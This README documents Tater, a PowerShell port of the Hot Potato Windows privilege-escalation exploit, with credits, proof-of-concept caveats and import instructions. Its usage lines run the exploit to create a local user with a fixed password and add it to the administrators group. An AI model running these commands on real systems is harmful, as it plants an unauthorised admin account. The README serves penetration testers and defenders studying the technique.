# Tater
Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit. This is mainly pieced together from existing Inveigh code.   

# Credit
All credit goes to @breenmachine, @foxglovesec, Google Project Zero, and anyone else that helped work out the details for this exploit.  
 
Potato - https://github.com/foxglovesec/Potato   

# Notes
Use caution, this is still very much in a proof of concept stage. It’s only been tested on Windows 7. It’s also still missing a lot of the features in Potato.exe. 
  
The most likely thing to go wrong is that the HTTP listener will not give port 80 without closing out your PowerShell process.   

# Usage
To import with Import-Module:   
Import-Module ./Tater.ps1   

To import using dot source method:   
. ./Tater.ps1  
 
Invoke-Tater -Command "net user tater Winter2016 /add && net localgroup administrators tater /add"   

Invoke-Tater -Command "net user tater Winter2016 /add && net localgroup administrators tater /add" –RunTime 10   
